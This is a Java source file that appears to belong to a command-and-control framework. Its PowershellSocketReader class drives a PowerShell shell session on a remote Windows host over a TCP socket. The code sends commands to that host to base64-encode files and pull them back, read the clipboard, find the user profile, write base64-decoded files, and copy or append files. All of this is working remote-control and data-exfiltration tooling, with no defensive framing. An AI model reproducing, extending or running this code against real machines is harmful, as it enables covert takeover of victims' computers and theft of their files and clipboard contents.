package c2.tcp;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.util.List;

import c2.session.IOManager;
import util.test.OutputStreamWriterHelper;

public class PowershellSocketReader extends SocketReader {

	public PowershellSocketReader(Socket socket, BufferedReader br) {
		super(socket, br, false);
	}

	private String processSocketRead(String command) throws IOException {
		String elements[] = command.split(WindowsSocketReader.WINDOWS_LINE_SEP);
		StringBuilder sb = new StringBuilder();
		for(int i = 0; i < elements.length - 1; i++) {
			sb.append(elements[i]);
			sb.append(WindowsSocketReader.WINDOWS_LINE_SEP);
		}
		return sb.toString();
	}
	
	@Override
	public String readUnknownLinesFromSocketWithTimeout(long timeout) throws IOException {
		String command = super.readUnknownLinesFromSocketWithTimeout(timeout);
		command = processSocketRead(command);
		return command;
	}

	@Override
	public String readUnknownLinesFromSocket() throws IOException {
		String command = super.readUnknownLinesFromSocket();
		command = processSocketRead(command);
		return command;
	}
	
	@Override
	public void executeCd(String cd, IOManager ioManager, OutputStreamWriter bw, int sessionId) throws IOException {
		OutputStreamWriterHelper.writeAndSend(bw, cd + WindowsSocketReader.WINDOWS_LINE_SEP);
		readUnknownLinesFromSocketWithTimeout(500);//Just to flush the return prompt
		ioManager.sendIO(sessionId, getPwd(bw, sessionId) + WindowsSocketReader.WINDOWS_LINE_SEP);
	}

	@Override
	public String getCurrentDirectoryNativeFormat(IOManager ioManager, OutputStreamWriter bw, int sessionId)
			throws IOException {
		OutputStreamWriterHelper.writeAndSend(bw, "dir" + WindowsSocketReader.WINDOWS_LINE_SEP);
		return readUnknownLinesFromSocketWithTimeout(500);
	}

	@Override
	public List<String> getCurrentDirectoriesFromNativeFormatDump(String parentDirectory, String dir) {
		throw new IllegalArgumentException();
	}

	@Override
	public List<String> getCurrentFilesFromNativeFormatDump(String parentDirectory, String dir) {
		throw new IllegalArgumentException();
	}

	@Override
	public String uplinkFileBase64(String filename, OutputStreamWriter bw, int sessionId) throws Exception {
		String uplinkCommand = "[Convert]::ToBase64String((Get-Content -Path '" + filename
				+ "' -Encoding Byte))";
		OutputStreamWriterHelper.writeAndSend(bw, uplinkCommand + WindowsSocketReader.WINDOWS_LINE_SEP);
		String response = readUnknownLinesFromSocketWithTimeout(2500);
		String lines[] = response.split(System.lineSeparator());
		if (lines.length != 0 && !response.contains("Get-Content : Cannot find path") && !lines[0].equals("")) {
			return lines[0];
		} else {
			throw new Exception("Invalid file name");
		}
	}

	@Override
	public String getPwd(OutputStreamWriter bw, int sessionId) {
		try {
			OutputStreamWriterHelper.writeAndSend(bw, "pwd");
			String response = readUnknownLinesFromSocketWithTimeout(1000);
			String lines[] = response.split(WindowsSocketReader.WINDOWS_LINE_SEP);
			return lines[3];
		} catch (Exception ex) {
			return "Unable to query current working directory";
		}
	}

	@Override
	public String getUserDirectory(OutputStreamWriter bw, int sessionId) {
		try {
			OutputStreamWriterHelper.writeAndSend(bw, "$env:USERPROFILE");
			String response = readUnknownLinesFromSocketWithTimeout(1000);
			String lines[] = response.split(WindowsSocketReader.WINDOWS_LINE_SEP);
			return lines[0];
		} catch (Exception ex) {
			return "Unable to query current working directory";
		}
	}

	@Override
	public String getClipboard(OutputStreamWriter bw, int sessionId) {
		try {
			OutputStreamWriterHelper.writeAndSend(bw, "powershell -c \"Get-Clipboard\"" + WindowsSocketReader.WINDOWS_LINE_SEP);
			return readUnknownLinesFromSocketWithTimeout(1000);
		} catch (Exception ex) {
			return "Unable to get clipboard";
		}
	}

	//If invoked directly in powershell [IO.File]::WriteAllBytes will write to the user's directory instead of the current directory
	//Also, for some reason the spaced file test will barf, but not the nominal test. Manual command execution directly into powershell
	//will work, but not with the shell. 
	@Override
	public String downloadBase64File(String filename, String b64, OutputStreamWriter bw, int sessionId)
			{
		try {
			String downloadCommand = "powershell -c \"[IO.File]::WriteAllBytes('" + filename + "', [Convert]::FromBase64String('" + b64 + "'))\"";
			OutputStreamWriterHelper.writeAndSend(bw, downloadCommand + WindowsSocketReader.WINDOWS_LINE_SEP);
			return readUnknownLinesFromSocketWithTimeout(1000);
		} catch (Exception ex) {
			return "Unable to write file";
		}
	}

	@Override
	public String executeCatCopyCommand(OutputStreamWriter bw, int sessionId, String cmd) {
		try {
			String elements[] = cmd.split(" ");
			String powershellCmd = "Copy-Item " + elements[1] + " -Destination " + elements[3];
			OutputStreamWriterHelper.writeAndSend(bw, powershellCmd + WindowsSocketReader.WINDOWS_LINE_SEP);
			String response = readUnknownLinesFromSocketWithTimeout(1000);
			if(!response.equals("")) {
				return "Unable to copy file: " + response;
			}else {
				return "File write executed";
			}
		} catch (Exception ex) {
			return "Unable to write file";
		}
	}

	@Override
	public String executeCatAppendCommand(OutputStreamWriter bw, int sessionId, String cmd) {
		try {
			String elements[] = cmd.split(" ");
			String powershellCmd = "$b64 = [Convert]::ToBase64String((Get-Content -Path '" + elements[1] + "' -Encoding Byte));$bytes = [System.Convert]::FromBase64String($b64);Add-Content -Path '" + elements[3] + "' -Value $bytes -Encoding Byte";
			OutputStreamWriterHelper.writeAndSend(bw, powershellCmd + WindowsSocketReader.WINDOWS_LINE_SEP);
			String response = readUnknownLinesFromSocketWithTimeout(1000);
			if(!response.equals("")) {
				return "Unable to copy file: " + response;
			}else {
				return "Appended file";
			}
		} catch (Exception ex) {
			return "Unable to write file";
		}
	}
}
